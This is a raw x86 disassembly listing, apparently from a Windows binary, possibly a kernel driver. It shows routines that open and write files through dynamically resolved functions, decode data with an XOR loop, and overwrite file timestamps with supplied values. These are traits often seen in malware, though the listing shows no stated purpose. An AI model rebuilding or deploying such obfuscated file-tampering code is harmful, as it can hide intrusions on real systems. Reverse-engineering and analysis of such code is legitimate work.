   177d9:	push   0x1c
   177db:	rep stos DWORD PTR es:[edi],eax
   177dd:	lea    eax,[ebp-0x4c]
   177e0:	push   eax
   177e1:	push   ebx
   177e2:	push   DWORD PTR [ebp+0x8]
   177e5:	call   0x1195c
   177ea:	call   eax
   177ec:	cmp    DWORD PTR [ebp-0x44],esi
   177ef:	jne    0x17825
   177f1:	push   ebx
   177f2:	push   0x4
   177f4:	lea    eax,[ebp+0xc]
   177f7:	push   eax
   177f8:	push   0x9
   177fa:	push   DWORD PTR [ebp+0x8]
   177fd:	mov    DWORD PTR [ebp+0xc],ebx
   17800:	call   0x1195c
   17805:	call   eax
   17807:	test   eax,eax
   17809:	jge    0x1780e
   1780b:	mov    DWORD PTR [ebp+0xc],ebx
   1780e:	cmp    DWORD PTR [ebp+0xc],ebx
   17811:	je     0x17825
   17813:	lea    eax,[ebp-0x30]
   17816:	push   eax
   17817:	push   DWORD PTR [ebp+0xc]
   1781a:	call   0x17396
   1781f:	push   ebx
   17820:	call   0x10f3a
   17825:	cmp    BYTE PTR [ebp-0x1],bl
   17828:	je     0x17893
   1782a:	mov    esi,DWORD PTR [ebp-0x1c]
   1782d:	cmp    esi,ebx
   1782f:	je     0x17893
   17831:	cmp    BYTE PTR [ebp-0xc],bl
   17834:	jne    0x17893
   17836:	push   0x6
   17838:	pop    ecx
   17839:	push   ebx
   1783a:	xor    eax,eax
   1783c:	mov    DWORD PTR [ebp-0x4c],ebx
   1783f:	lea    edi,[ebp-0x48]
   17842:	push   0x1c
   17844:	rep stos DWORD PTR es:[edi],eax
   17846:	lea    eax,[ebp-0x4c]
   17849:	push   eax
   1784a:	push   ebx
   1784b:	push   DWORD PTR [ebp+0x8]
   1784e:	call   0x1195c
   17853:	call   eax
   17855:	cmp    DWORD PTR [ebp-0x44],esi
   17858:	jne    0x17893
   1785a:	push   ebx
   1785b:	push   0x4
   1785d:	lea    eax,[ebp+0xc]
   17860:	push   eax
   17861:	push   0x9
   17863:	push   DWORD PTR [ebp+0x8]
   17866:	mov    DWORD PTR [ebp+0xc],ebx
   17869:	call   0x1195c
   1786e:	call   eax
   17870:	test   eax,eax
   17872:	jge    0x17877
   17874:	mov    DWORD PTR [ebp+0xc],ebx
   17877:	cmp    DWORD PTR [ebp+0xc],ebx
   1787a:	je     0x17893
   1787c:	lea    eax,[ebp-0x1c]
   1787f:	push   eax
   17880:	push   DWORD PTR [ebp+0xc]
   17883:	call   0x124ec
   17888:	lea    eax,[ebp-0x1c]
   1788b:	push   eax
   1788c:	push   0x1
   1788e:	call   0x10ef2
   17893:	mov    eax,DWORD PTR [ebp-0x8]
   17896:	pop    edi
   17897:	pop    esi
   17898:	pop    ebx
   17899:	leave  
   1789a:	ret    0x8
   1789d:	int3   
   1789e:	int3   
   1789f:	int3   
   178a0:	int3   
   178a1:	int3   
   178a2:	push   0x24
   178a4:	push   0x7e018
   178a9:	call   0x1dadc
   178ae:	xor    ebx,ebx
   178b0:	push   ebx
   178b1:	push   ebx
   178b2:	push   ebx
   178b3:	push   ebx
   178b4:	push   0x7eb70
   178b9:	call   DWORD PTR ds:0x1ee28
   178bf:	cmp    eax,ebx
   178c1:	jge    0x178d2
   178c3:	mov    eax,DWORD PTR [ebp+0x8]
   178c6:	mov    DWORD PTR [eax+0x8],0x4
   178cd:	jmp    0x1798a
   178d2:	mov    DWORD PTR [ebp-0x4],ebx
   178d5:	push   0xffffffff
   178d7:	mov    esi,DWORD PTR [ebp+0x8]
   178da:	lea    eax,[esi+0xc]
   178dd:	push   eax
   178de:	lea    ecx,[ebp-0x24]
   178e1:	call   0x129a8
   178e6:	push   0xffffffff
   178e8:	mov    eax,DWORD PTR [ebp-0x20]
   178eb:	lea    eax,[eax+esi*1+0xd]
   178ef:	push   eax
   178f0:	lea    ecx,[ebp-0x2c]
   178f3:	call   0x129a8
   178f8:	push   0xffffffff
   178fa:	push   0x1def0
   178ff:	lea    ecx,[ebp-0x34]
   17902:	call   0x110cc
   17907:	lea    eax,[ebp-0x34]
   1790a:	push   eax
   1790b:	lea    eax,[ebp-0x2c]
   1790e:	push   eax
   1790f:	call   0x197f8
   17914:	mov    BYTE PTR [ebp-0x19],al
   17917:	push   DWORD PTR [ebp-0x34]
   1791a:	call   0x10a9a
   1791f:	pop    ecx
   17920:	lea    eax,[ebp-0x24]
   17923:	mov    ecx,DWORD PTR ds:0x7eb40
   17929:	push   eax
   1792a:	cmp    BYTE PTR [ebp-0x19],bl
   1792d:	je     0x17936
   1792f:	call   0x161b0
   17934:	jmp    0x17946
   17936:	call   0x16ef8
   1793b:	lea    ecx,[ebp-0x2c]
   1793e:	push   ecx
   1793f:	mov    ecx,eax
   17941:	call   0x129ea
   17946:	mov    DWORD PTR [esi+0x8],ebx
   17949:	push   DWORD PTR [ebp-0x2c]
   1794c:	call   0x10a9a
   17951:	push   DWORD PTR [ebp-0x24]
   17954:	call   0x10a9a
   17959:	pop    ecx
   1795a:	pop    ecx
   1795b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17962:	jmp    0x1797e
   17964:	xor    eax,eax
   17966:	inc    eax
   17967:	ret    
   17968:	mov    esp,DWORD PTR [ebp-0x18]
   1796b:	mov    eax,DWORD PTR [ebp+0x8]
   1796e:	mov    DWORD PTR [eax+0x8],0x4
   17975:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1797c:	xor    ebx,ebx
   1797e:	push   ebx
   1797f:	push   0x7eb70
   17984:	call   DWORD PTR ds:0x1ee24
   1798a:	call   0x1db21
   1798f:	ret    0x4
   17992:	int3   
   17993:	int3   
   17994:	int3   
   17995:	int3   
   17996:	int3   
   17997:	int3   
   17998:	push   0xc
   1799a:	push   0x7e038
   1799f:	call   0x1dadc
   179a4:	xor    edi,edi
   179a6:	push   edi
   179a7:	push   edi
   179a8:	push   edi
   179a9:	push   edi
   179aa:	push   0x7eb70
   179af:	call   DWORD PTR ds:0x1ee28
   179b5:	cmp    eax,edi
   179b7:	jge    0x179c5
   179b9:	mov    eax,DWORD PTR [ebp+0x8]
   179bc:	mov    DWORD PTR [eax+0x8],0x4
   179c3:	jmp    0x17a3b
   179c5:	mov    DWORD PTR [ebp-0x4],edi
   179c8:	mov    esi,DWORD PTR [ebp+0x8]
   179cb:	lea    eax,[esi+0x4]
   179ce:	mov    ecx,DWORD PTR ds:0x7ebcc
   179d4:	push   eax
   179d5:	cmp    DWORD PTR [esi],edi
   179d7:	jbe    0x17a04
   179d9:	call   0x16f68
   179de:	mov    ebx,eax
   179e0:	push   DWORD PTR [esi]
   179e2:	lea    eax,[esi+0xc]
   179e5:	push   eax
   179e6:	lea    ecx,[ebp-0x1c]
   179e9:	call   0x137bc
   179ee:	push   eax
   179ef:	mov    ecx,ebx
   179f1:	call   0x11f4e
   179f6:	mov    ecx,DWORD PTR [ebp-0x1c]
   179f9:	cmp    ecx,edi
   179fb:	je     0x17a09
   179fd:	call   0x10ab8
   17a02:	jmp    0x17a09
   17a04:	call   0x16b9a
   17a09:	mov    DWORD PTR [esi+0x8],edi
   17a0c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17a13:	jmp    0x17a2f
   17a15:	xor    eax,eax
   17a17:	inc    eax
   17a18:	ret    
   17a19:	mov    esp,DWORD PTR [ebp-0x18]
   17a1c:	mov    eax,DWORD PTR [ebp+0x8]
   17a1f:	mov    DWORD PTR [eax+0x8],0x4
   17a26:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17a2d:	xor    edi,edi
   17a2f:	push   edi
   17a30:	push   0x7eb70
   17a35:	call   DWORD PTR ds:0x1ee24
   17a3b:	call   0x1db21
   17a40:	ret    0x4
   17a43:	int3   
   17a44:	int3   
   17a45:	int3   
   17a46:	int3   
   17a47:	int3   
   17a48:	mov    edi,edi
   17a4a:	push   ebp
   17a4b:	mov    ebp,esp
   17a4d:	sub    esp,0x10
   17a50:	and    DWORD PTR [ebp-0xc],0x0
   17a54:	xor    ecx,ecx
   17a56:	mov    DWORD PTR [ebp-0x10],0x1
   17a5d:	xor    eax,eax
   17a5f:	mov    dl,BYTE PTR [eax+0x7a398]
   17a65:	xor    BYTE PTR [ebp+ecx*1-0x10],dl
   17a69:	inc    ecx
   17a6a:	inc    eax
   17a6b:	and    eax,0xf
   17a6e:	cmp    ecx,0x8
   17a71:	jne    0x17a5f
   17a73:	push   ecx
   17a74:	lea    eax,[ebp-0x10]
   17a77:	push   eax
   17a78:	lea    ecx,[ebp-0x8]
   17a7b:	mov    DWORD PTR [ebp-0x4],0x2
   17a82:	call   0x137bc
   17a87:	mov    ecx,DWORD PTR ds:0x7ebcc
   17a8d:	push   eax
   17a8e:	lea    eax,[ebp-0x4]
   17a91:	push   eax
   17a92:	call   0x16f68
   17a97:	mov    ecx,eax
   17a99:	call   0x11f4e
   17a9e:	mov    ecx,DWORD PTR [ebp-0x8]
   17aa1:	test   ecx,ecx
   17aa3:	je     0x17aaa
   17aa5:	call   0x10ab8
   17aaa:	leave  
   17aab:	ret    
   17aac:	int3   
   17aad:	int3   
   17aae:	int3   
   17aaf:	int3   
   17ab0:	int3   
   17ab1:	int3   
   17ab2:	push   0x848
   17ab7:	push   0x7e058
   17abc:	call   0x1dde0
   17ac1:	xor    ebx,ebx
   17ac3:	mov    BYTE PTR [ebp-0x81d],bl
   17ac9:	xor    eax,eax
   17acb:	mov    WORD PTR [ebp-0x81c],ax
   17ad2:	push   0x7fe
   17ad7:	push   ebx
   17ad8:	lea    eax,[ebp-0x81a]
   17ade:	push   eax
   17adf:	call   0x1dab8
   17ae4:	add    esp,0xc
   17ae7:	push   0x1e81e
   17aec:	push   0x15
   17aee:	push   0x1e7f2
   17af3:	call   0x16c9e
   17af8:	mov    edx,eax
   17afa:	mov    cx,WORD PTR [eax]
   17afd:	inc    eax
   17afe:	inc    eax
   17aff:	cmp    cx,bx
   17b02:	jne    0x17afa
   17b04:	sub    eax,edx
   17b06:	lea    edi,[ebp-0x81c]
   17b0c:	dec    edi
   17b0d:	dec    edi
   17b0e:	mov    cx,WORD PTR [edi+0x2]
   17b12:	inc    edi
   17b13:	inc    edi
   17b14:	cmp    cx,bx
   17b17:	jne    0x17b0e
   17b19:	mov    ecx,eax
   17b1b:	mov    esi,edx
   17b1d:	shr    ecx,0x2
   17b20:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b22:	mov    ecx,eax
   17b24:	and    ecx,0x3
   17b27:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17b29:	mov    eax,0x7e208
   17b2e:	mov    edx,eax
   17b30:	mov    cx,WORD PTR [eax]
   17b33:	inc    eax
   17b34:	inc    eax
   17b35:	cmp    cx,bx
   17b38:	jne    0x17b30
   17b3a:	sub    eax,edx
   17b3c:	lea    edi,[ebp-0x81c]
   17b42:	dec    edi
   17b43:	dec    edi
   17b44:	mov    cx,WORD PTR [edi+0x2]
   17b48:	inc    edi
   17b49:	inc    edi
   17b4a:	cmp    cx,bx
   17b4d:	jne    0x17b44
   17b4f:	mov    ecx,eax
   17b51:	mov    esi,edx
   17b53:	shr    ecx,0x2
   17b56:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b58:	mov    ecx,eax
   17b5a:	and    ecx,0x3
   17b5d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17b5f:	push   0x1e7be
   17b64:	push   0x4
   17b66:	push   0x1e59e
   17b6b:	call   0x16c9e
   17b70:	mov    edx,eax
   17b72:	mov    cx,WORD PTR [eax]
   17b75:	inc    eax
   17b76:	inc    eax
   17b77:	cmp    cx,bx
   17b7a:	jne    0x17b72
   17b7c:	sub    eax,edx
   17b7e:	lea    edi,[ebp-0x81c]
   17b84:	dec    edi
   17b85:	dec    edi
   17b86:	mov    cx,WORD PTR [edi+0x2]
   17b8a:	inc    edi
   17b8b:	inc    edi
   17b8c:	cmp    cx,bx
   17b8f:	jne    0x17b86
   17b91:	mov    ecx,eax
   17b93:	mov    esi,edx
   17b95:	shr    ecx,0x2
   17b98:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b9a:	mov    ecx,eax
   17b9c:	and    ecx,0x3
   17b9f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17ba1:	lea    eax,[ebp-0x81c]
   17ba7:	push   eax
   17ba8:	lea    eax,[ebp-0x858]
   17bae:	push   eax
   17baf:	call   0x11c7a
   17bb4:	call   eax
   17bb6:	mov    DWORD PTR [ebp-0x824],ebx
   17bbc:	xor    eax,eax
   17bbe:	lea    edi,[ebp-0x84c]
   17bc4:	stos   DWORD PTR es:[edi],eax
   17bc5:	stos   DWORD PTR es:[edi],eax
   17bc6:	stos   DWORD PTR es:[edi],eax
   17bc7:	stos   DWORD PTR es:[edi],eax
   17bc8:	stos   DWORD PTR es:[edi],eax
   17bc9:	mov    DWORD PTR [ebp-0x830],ebx
   17bcf:	xor    eax,eax
   17bd1:	lea    edi,[ebp-0x82c]
   17bd7:	stos   DWORD PTR es:[edi],eax
   17bd8:	mov    DWORD PTR [ebp-0x850],0x18
   17be2:	mov    DWORD PTR [ebp-0x84c],ebx
   17be8:	mov    DWORD PTR [ebp-0x844],0x240
   17bf2:	lea    eax,[ebp-0x858]
   17bf8:	mov    DWORD PTR [ebp-0x848],eax
   17bfe:	mov    DWORD PTR [ebp-0x840],ebx
   17c04:	mov    DWORD PTR [ebp-0x83c],ebx
   17c0a:	push   ebx
   17c0b:	push   ebx
   17c0c:	push   0x60
   17c0e:	push   0x1
   17c10:	push   ebx
   17c11:	push   0x80
   17c16:	push   ebx
   17c17:	lea    eax,[ebp-0x830]
   17c1d:	push   eax
   17c1e:	lea    eax,[ebp-0x850]
   17c24:	push   eax
   17c25:	push   0x100001
   17c2a:	lea    eax,[ebp-0x824]
   17c30:	push   eax
   17c31:	call   0x1188a
   17c36:	call   eax
   17c38:	cmp    eax,ebx
   17c3a:	jge    0x17c43
   17c3c:	xor    al,al
   17c3e:	jmp    0x17cd8
   17c43:	mov    DWORD PTR [ebp-0x4],ebx
   17c46:	mov    esi,DWORD PTR [ebp+0xc]
   17c49:	mov    eax,0x10000
   17c4e:	cmp    esi,eax
   17c50:	jbe    0x17c54
   17c52:	mov    esi,eax
   17c54:	push   esi
   17c55:	call   0x10a66
   17c5a:	pop    ecx
   17c5b:	mov    DWORD PTR [ebp-0x828],eax
   17c61:	mov    DWORD PTR [ebp-0x838],ebx
   17c67:	xor    eax,eax
   17c69:	lea    edi,[ebp-0x834]
   17c6f:	stos   DWORD PTR es:[edi],eax
   17c70:	push   ebx
   17c71:	lea    eax,[ebp-0x838]
   17c77:	push   eax
   17c78:	push   esi
   17c79:	push   DWORD PTR [ebp-0x828]
   17c7f:	lea    eax,[ebp-0x830]
   17c85:	push   eax
   17c86:	push   ebx
   17c87:	push   ebx
   17c88:	push   ebx
   17c89:	push   DWORD PTR [ebp-0x824]
   17c8f:	call   0x11ad6
   17c94:	call   eax
   17c96:	cmp    eax,ebx
   17c98:	jl     0x17cbf
   17c9a:	mov    ecx,DWORD PTR [ebp-0x82c]
   17ca0:	mov    edi,DWORD PTR [ebp+0x8]
   17ca3:	mov    esi,DWORD PTR [ebp-0x828]
   17ca9:	xor    eax,eax
   17cab:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   17cad:	sete   al
   17cb0:	mov    BYTE PTR [ebp-0x81d],al
   17cb6:	jmp    0x17cbf
   17cb8:	xor    eax,eax
   17cba:	inc    eax
   17cbb:	ret    
   17cbc:	mov    esp,DWORD PTR [ebp-0x18]
   17cbf:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17cc6:	push   DWORD PTR [ebp-0x824]
   17ccc:	call   DWORD PTR ds:0x1ee60
   17cd2:	mov    al,BYTE PTR [ebp-0x81d]
   17cd8:	call   0x1de28
   17cdd:	ret    0x8
   17ce0:	int3   
   17ce1:	int3   
   17ce2:	int3   
   17ce3:	int3   
   17ce4:	int3   
   17ce5:	int3   
   17ce6:	push   0x874
   17ceb:	push   0x7e078
   17cf0:	call   0x1dde0
   17cf5:	mov    eax,DWORD PTR [ebp+0x8]
   17cf8:	mov    DWORD PTR [ebp-0x830],eax
   17cfe:	xor    ebx,ebx
   17d00:	mov    BYTE PTR [ebp-0x81d],bl
   17d06:	xor    eax,eax
   17d08:	mov    WORD PTR [ebp-0x81c],ax
   17d0f:	push   0x7fe
   17d14:	push   ebx
   17d15:	lea    eax,[ebp-0x81a]
   17d1b:	push   eax
   17d1c:	call   0x1dab8
   17d21:	add    esp,0xc
   17d24:	push   0x1e882
   17d29:	push   0x15
   17d2b:	push   0x1e7f2
   17d30:	call   0x16c9e
   17d35:	mov    edx,eax
   17d37:	mov    cx,WORD PTR [eax]
   17d3a:	inc    eax
   17d3b:	inc    eax
   17d3c:	cmp    cx,bx
   17d3f:	jne    0x17d37
   17d41:	sub    eax,edx
   17d43:	lea    edi,[ebp-0x81c]
   17d49:	dec    edi
   17d4a:	dec    edi
   17d4b:	mov    cx,WORD PTR [edi+0x2]
   17d4f:	inc    edi
   17d50:	inc    edi
   17d51:	cmp    cx,bx
   17d54:	jne    0x17d4b
   17d56:	mov    ecx,eax
   17d58:	mov    esi,edx
   17d5a:	shr    ecx,0x2
   17d5d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17d5f:	mov    ecx,eax
   17d61:	and    ecx,0x3
   17d64:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17d66:	mov    eax,0x7e208
   17d6b:	mov    edx,eax
   17d6d:	mov    cx,WORD PTR [eax]
   17d70:	inc    eax
   17d71:	inc    eax
   17d72:	cmp    cx,bx
   17d75:	jne    0x17d6d
   17d77:	sub    eax,edx
   17d79:	lea    edi,[ebp-0x81c]
   17d7f:	dec    edi
   17d80:	dec    edi
   17d81:	mov    cx,WORD PTR [edi+0x2]
   17d85:	inc    edi
   17d86:	inc    edi
   17d87:	cmp    cx,bx
   17d8a:	jne    0x17d81
   17d8c:	mov    ecx,eax
   17d8e:	mov    esi,edx
   17d90:	shr    ecx,0x2
   17d93:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17d95:	mov    ecx,eax
   17d97:	and    ecx,0x3
   17d9a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17d9c:	push   0x1e844
   17da1:	push   0x4
   17da3:	push   0x1e59e
   17da8:	call   0x16c9e
   17dad:	mov    edx,eax
   17daf:	mov    cx,WORD PTR [eax]
   17db2:	inc    eax
   17db3:	inc    eax
   17db4:	cmp    cx,bx
   17db7:	jne    0x17daf
   17db9:	sub    eax,edx
   17dbb:	lea    edi,[ebp-0x81c]
   17dc1:	dec    edi
   17dc2:	dec    edi
   17dc3:	mov    cx,WORD PTR [edi+0x2]
   17dc7:	inc    edi
   17dc8:	inc    edi
   17dc9:	cmp    cx,bx
   17dcc:	jne    0x17dc3
   17dce:	mov    ecx,eax
   17dd0:	mov    esi,edx
   17dd2:	shr    ecx,0x2
   17dd5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17dd7:	mov    ecx,eax
   17dd9:	and    ecx,0x3
   17ddc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17dde:	lea    eax,[ebp-0x81c]
   17de4:	push   eax
   17de5:	lea    eax,[ebp-0x884]
   17deb:	push   eax
   17dec:	call   0x11c7a
   17df1:	call   eax
   17df3:	mov    DWORD PTR [ebp-0x824],ebx
   17df9:	xor    eax,eax
   17dfb:	lea    edi,[ebp-0x850]
   17e01:	stos   DWORD PTR es:[edi],eax
   17e02:	stos   DWORD PTR es:[edi],eax
   17e03:	stos   DWORD PTR es:[edi],eax
   17e04:	stos   DWORD PTR es:[edi],eax
   17e05:	stos   DWORD PTR es:[edi],eax
   17e06:	mov    DWORD PTR [ebp-0x82c],ebx
   17e0c:	xor    eax,eax
   17e0e:	lea    edi,[ebp-0x828]
   17e14:	stos   DWORD PTR es:[edi],eax
   17e15:	mov    DWORD PTR [ebp-0x854],0x18
   17e1f:	mov    DWORD PTR [ebp-0x850],ebx
   17e25:	mov    DWORD PTR [ebp-0x848],0x240
   17e2f:	lea    eax,[ebp-0x884]
   17e35:	mov    DWORD PTR [ebp-0x84c],eax
   17e3b:	mov    DWORD PTR [ebp-0x844],ebx
   17e41:	mov    DWORD PTR [ebp-0x840],ebx
   17e47:	push   ebx
   17e48:	push   ebx
   17e49:	push   0x60
   17e4b:	push   ebx
   17e4c:	push   ebx
   17e4d:	push   0x80
   17e52:	push   ebx
   17e53:	lea    eax,[ebp-0x82c]
   17e59:	push   eax
   17e5a:	lea    eax,[ebp-0x854]
   17e60:	push   eax
   17e61:	push   0x100002
   17e66:	lea    eax,[ebp-0x824]
   17e6c:	push   eax
   17e6d:	call   0x1188a
   17e72:	call   eax
   17e74:	cmp    eax,ebx
   17e76:	jge    0x17e7f
   17e78:	xor    al,al
   17e7a:	jmp    0x17f84
   17e7f:	mov    DWORD PTR [ebp-0x4],ebx
   17e82:	xor    eax,eax
   17e84:	lea    edi,[ebp-0x82c]
   17e8a:	stos   DWORD PTR es:[edi],eax
   17e8b:	stos   DWORD PTR es:[edi],eax
   17e8c:	xor    edi,edi
   17e8e:	mov    esi,0x10000
   17e93:	mov    DWORD PTR [ebp-0x834],edi
   17e99:	mov    eax,DWORD PTR [ebp+0xc]
   17e9c:	cmp    edi,eax
   17e9e:	jae    0x17ee9
   17ea0:	mov    DWORD PTR [ebp-0x83c],ebx
   17ea6:	mov    DWORD PTR [ebp-0x83c],edi
   17eac:	mov    DWORD PTR [ebp-0x838],ebx
   17eb2:	sub    eax,edi
   17eb4:	cmp    eax,esi
   17eb6:	jb     0x17eba
   17eb8:	mov    eax,esi
   17eba:	push   ebx
   17ebb:	push   ebx
   17ebc:	push   eax
   17ebd:	mov    eax,DWORD PTR [ebp-0x830]
   17ec3:	add    eax,edi
   17ec5:	push   eax
   17ec6:	lea    eax,[ebp-0x82c]
   17ecc:	push   eax
   17ecd:	push   ebx
   17ece:	push   ebx
   17ecf:	push   ebx
   17ed0:	push   DWORD PTR [ebp-0x824]
   17ed6:	call   0x11b2a
   17edb:	call   eax
   17edd:	cmp    eax,ebx
   17edf:	jl     0x17f6b
   17ee5:	add    edi,esi
   17ee7:	jmp    0x17e93
   17ee9:	mov    BYTE PTR [ebp-0x81d],0x1
   17ef0:	mov    DWORD PTR [ebp-0x87c],ebx
   17ef6:	push   0x9
   17ef8:	pop    ecx
   17ef9:	xor    eax,eax
   17efb:	lea    edi,[ebp-0x878]
   17f01:	rep stos DWORD PTR es:[edi],eax
   17f03:	mov    eax,DWORD PTR [ebp+0x10]
   17f06:	mov    DWORD PTR [ebp-0x86c],eax
   17f0c:	mov    ecx,DWORD PTR [ebp+0x14]
   17f0f:	mov    DWORD PTR [ebp-0x868],ecx
   17f15:	mov    DWORD PTR [ebp-0x874],eax
   17f1b:	mov    DWORD PTR [ebp-0x870],ecx
   17f21:	mov    DWORD PTR [ebp-0x864],eax
   17f27:	mov    DWORD PTR [ebp-0x860],ecx
   17f2d:	mov    DWORD PTR [ebp-0x87c],eax
   17f33:	mov    DWORD PTR [ebp-0x878],ecx
   17f39:	mov    DWORD PTR [ebp-0x85c],0x80
   17f43:	push   0x4
   17f45:	push   0x28
   17f47:	lea    eax,[ebp-0x87c]
   17f4d:	push   eax
   17f4e:	lea    eax,[ebp-0x82c]
   17f54:	push   eax
   17f55:	push   DWORD PTR [ebp-0x824]
   17f5b:	call   0x11b00
   17f60:	call   eax
   17f62:	jmp    0x17f6b
   17f64:	xor    eax,eax
   17f66:	inc    eax
   17f67:	ret    
   17f68:	mov    esp,DWORD PTR [ebp-0x18]
   17f6b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17f72:	push   DWORD PTR [ebp-0x824]
   17f78:	call   DWORD PTR ds:0x1ee60
   17f7e:	mov    al,BYTE PTR [ebp-0x81d]
   17f84:	call   0x1de28
   17f89:	ret    0x10
   17f8c:	int3   
   17f8d:	int3   
   17f8e:	int3   
   17f8f:	int3   
   17f90:	int3   
   17f91:	int3   
   17f92:	push   0x874
   17f97:	push   0x7e098
   17f9c:	call   0x1dde0
   17fa1:	xor    ebx,ebx
   17fa3:	mov    BYTE PTR [ebp-0x81d],bl
   17fa9:	mov    BYTE PTR [ebp-0x81e],bl
   17faf:	mov    DWORD PTR [ebp-0x828],ebx
   17fb5:	mov    DWORD PTR [ebp-0x824],ebx
   17fbb:	xor    eax,eax
   17fbd:	mov    WORD PTR [ebp-0x81c],ax
   17fc4:	push   0x7fe
   17fc9:	push   ebx
   17fca:	lea    eax,[ebp-0x81a]
   17fd0:	push   eax
   17fd1:	call   0x1dab8
   17fd6:	add    esp,0xc
   17fd9:	push   0x1e8ee
   17fde:	push   0x15
   17fe0:	push   0x1e7f2
   17fe5:	call   0x16c9e
   17fea:	mov    edx,eax
   17fec:	mov    cx,WORD PTR [eax]
   17fef:	inc    eax
   17ff0:	inc    eax
   17ff1:	cmp    cx,bx
   17ff4:	jne    0x17fec
   17ff6:	sub    eax,edx
   17ff8:	lea    edi,[ebp-0x81c]
   17ffe:	dec    edi
   17fff:	dec    edi
   18000:	mov    cx,WORD PTR [edi+0x2]
   18004:	inc    edi
   18005:	inc    edi
   18006:	cmp    cx,bx
   18009:	jne    0x18000
   1800b:	mov    ecx,eax
   1800d:	mov    esi,edx
   1800f:	shr    ecx,0x2
   18012:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18014:	mov    ecx,eax
   18016:	and    ecx,0x3
   18019:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1801b:	mov    eax,0x7e248
   18020:	mov    edx,eax
   18022:	mov    cx,WORD PTR [eax]
   18025:	inc    eax
   18026:	inc    eax
   18027:	cmp    cx,bx
   1802a:	jne    0x18022
   1802c:	sub    eax,edx
   1802e:	lea    edi,[ebp-0x81c]
   18034:	dec    edi
   18035:	dec    edi
   18036:	mov    cx,WORD PTR [edi+0x2]
   1803a:	inc    edi
   1803b:	inc    edi
   1803c:	cmp    cx,bx
   1803f:	jne    0x18036
   18041:	mov    ecx,eax
   18043:	mov    esi,edx
   18045:	shr    ecx,0x2
   18048:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1804a:	mov    ecx,eax
   1804c:	and    ecx,0x3
   1804f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18051:	push   0x1e8c0
   18056:	push   0x4
   18058:	push   0x1e8b6
   1805d:	call   0x16c9e
   18062:	mov    edx,eax
   18064:	mov    cx,WORD PTR [eax]
   18067:	inc    eax
   18068:	inc    eax
   18069:	cmp    cx,bx
   1806c:	jne    0x18064
   1806e:	sub    eax,edx
   18070:	lea    edi,[ebp-0x81c]
   18076:	dec    edi
   18077:	dec    edi
   18078:	mov    cx,WORD PTR [edi+0x2]
   1807c:	inc    edi
   1807d:	inc    edi
   1807e:	cmp    cx,bx
   18081:	jne    0x18078
   18083:	mov    ecx,eax
   18085:	mov    esi,edx
   18087:	shr    ecx,0x2
   1808a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1808c:	mov    ecx,eax
   1808e:	and    ecx,0x3
   18091:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18093:	lea    eax,[ebp-0x81c]
   18099:	push   eax
   1809a:	lea    eax,[ebp-0x85c]
   180a0:	push   eax
   180a1:	call   0x11c7a
   180a6:	call   eax
   180a8:	xor    eax,eax
   180aa:	lea    edi,[ebp-0x850]
   180b0:	stos   DWORD PTR es:[edi],eax
   180b1:	stos   DWORD PTR es:[edi],eax
   180b2:	stos   DWORD PTR es:[edi],eax
   180b3:	stos   DWORD PTR es:[edi],eax
   180b4:	stos   DWORD PTR es:[edi],eax
   180b5:	mov    DWORD PTR [ebp-0x834],ebx
   180bb:	xor    eax,eax
   180bd:	lea    edi,[ebp-0x830]
   180c3:	stos   DWORD PTR es:[edi],eax
   180c4:	mov    DWORD PTR [ebp-0x82c],ebx
   180ca:	mov    DWORD PTR [ebp-0x854],0x18
   180d4:	mov    DWORD PTR [ebp-0x850],ebx
   180da:	mov    DWORD PTR [ebp-0x848],0x240
   180e4:	lea    eax,[ebp-0x85c]
   180ea:	mov    DWORD PTR [ebp-0x84c],eax
   180f0:	mov    DWORD PTR [ebp-0x844],ebx
   180f6:	mov    DWORD PTR [ebp-0x840],ebx
   180fc:	push   ebx
   180fd:	push   ebx
   180fe:	push   ebx
   180ff:	push   0x1
   18101:	push   0x7
   18103:	push   ebx
   18104:	push   ebx
   18105:	lea    eax,[ebp-0x834]
   1810b:	push   eax
   1810c:	lea    eax,[ebp-0x854]
   18112:	push   eax
   18113:	push   0x89
   18118:	lea    eax,[ebp-0x82c]
   1811e:	push   eax
   1811f:	call   0x1188a
   18124:	call   eax
   18126:	cmp    eax,ebx
   18128:	jge    0x18131
   1812a:	xor    al,al
   1812c:	jmp    0x18250
   18131:	mov    DWORD PTR [ebp-0x884],ebx
   18137:	push   0x9
   18139:	pop    ecx
   1813a:	xor    eax,eax
   1813c:	lea    edi,[ebp-0x880]
   18142:	rep stos DWORD PTR es:[edi],eax
   18144:	mov    DWORD PTR [ebp-0x4],ebx
   18147:	push   0x4
   18149:	push   0x28
   1814b:	lea    eax,[ebp-0x884]
   18151:	push   eax
   18152:	lea    eax,[ebp-0x834]
   18158:	push   eax
   18159:	push   DWORD PTR [ebp-0x82c]
   1815f:	call   0x11b54
   18164:	call   eax
   18166:	cmp    eax,ebx
   18168:	jl     0x181e6
   1816a:	mov    esi,0x5b4cf
   1816f:	push   esi
   18170:	call   0x10a66
   18175:	mov    edi,eax
   18177:	push   esi
   18178:	push   0x1eea0
   1817d:	push   edi
